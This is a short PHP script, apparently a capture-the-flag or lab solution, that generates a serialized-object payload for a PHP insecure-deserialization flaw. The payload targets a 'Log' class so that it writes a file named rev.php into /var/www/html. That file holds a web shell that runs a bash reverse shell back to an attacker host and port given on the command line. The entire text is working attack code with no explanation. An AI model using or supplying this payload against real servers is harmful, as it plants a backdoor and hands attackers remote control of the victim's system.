<?php
    class Log {
        public function __construct($f, $m) {
            $this->f = $f;
            $this->m = $m;
        }
    }
    $lhost = $argv[1];
    $lport = $argv[2];
    $payload = "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'\"); ?>";
    $log = new Log('/var/www/html/rev.php',$payload);
    print(serialize($log));
?>
